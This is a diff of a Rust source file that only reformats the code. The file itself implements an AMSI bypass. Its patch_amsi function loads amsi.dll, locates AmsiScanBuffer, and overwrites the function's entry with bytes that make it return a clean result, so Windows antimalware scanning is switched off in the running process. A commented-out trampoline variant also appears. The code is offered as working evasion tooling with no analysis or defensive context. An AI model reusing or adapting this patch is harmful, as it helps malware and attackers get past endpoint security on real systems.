@@ -1,35 +1,44 @@
 use std::ffi::c_void;
 
-use windows::Win32::System::{Diagnostics::Debug::WriteProcessMemory, LibraryLoader::{GetProcAddress, LoadLibraryA}, Memory::{VirtualAlloc, VirtualAllocEx, VirtualProtect, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE}, Threading::{GetCurrentProcess, OpenProcess, PROCESS_ALL_ACCESS}};
+use windows::Win32::System::{
+    Diagnostics::Debug::WriteProcessMemory,
+    LibraryLoader::{GetProcAddress, LoadLibraryA},
+    Memory::{
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, VirtualAlloc,
+        VirtualAllocEx, VirtualProtect, VirtualProtectEx,
+    },
+    Threading::{GetCurrentProcess, OpenProcess, PROCESS_ALL_ACCESS},
+};
 use windows_core::s;
 
 pub fn patch_amsi() {
     let hmodule = unsafe { LoadLibraryA(s!("amsi.dll")).unwrap() };
-    let addr = unsafe { GetProcAddress(hmodule, s!("AmsiScanBuffer")).unwrap()} ;
+    let addr = unsafe { GetProcAddress(hmodule, s!("AmsiScanBuffer")).unwrap() };
     let target_ptr = addr as *const c_void;
 
-    let patch: [u8;3] = [0x31, 0xC0, 0xC3];
+    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
 
     unsafe {
         WriteProcessMemory(
-            GetCurrentProcess(), 
-            target_ptr, 
-            patch.as_ptr() as *const c_void, 
-            patch.len(), 
-            None
-        ).unwrap();
+            GetCurrentProcess(),
+            target_ptr,
+            patch.as_ptr() as *const c_void,
+            patch.len(),
+            None,
+        )
+        .unwrap();
     }
 }
 
 //pub fn patch_amsi() {
-//    let trampoline_ptr = unsafe { 
+//    let trampoline_ptr = unsafe {
 //        VirtualAllocEx(
-//            GetCurrentProcess(), 
-//            None, 
-//            0x6, 
-//            MEM_COMMIT | MEM_RESERVE, 
+//            GetCurrentProcess(),
+//            None,
+//            0x6,
+//            MEM_COMMIT | MEM_RESERVE,
 //            PAGE_EXECUTE_READWRITE,
-//        ) 
+//        )
 //    };
 //
 //    if trampoline_ptr.is_null() {
@@ -58,10 +67,10 @@ pub fn patch_amsi() {
 //
 //    unsafe {
 //        WriteProcessMemory(
-//            GetCurrentProcess(), 
-//            target_ptr, 
-//            patch.as_ptr() as *const c_void, 
-//            patch.len(), 
+//            GetCurrentProcess(),
+//            target_ptr,
+//            patch.as_ptr() as *const c_void,
+//            patch.len(),
 //            None
 //        ).unwrap();
 //    }
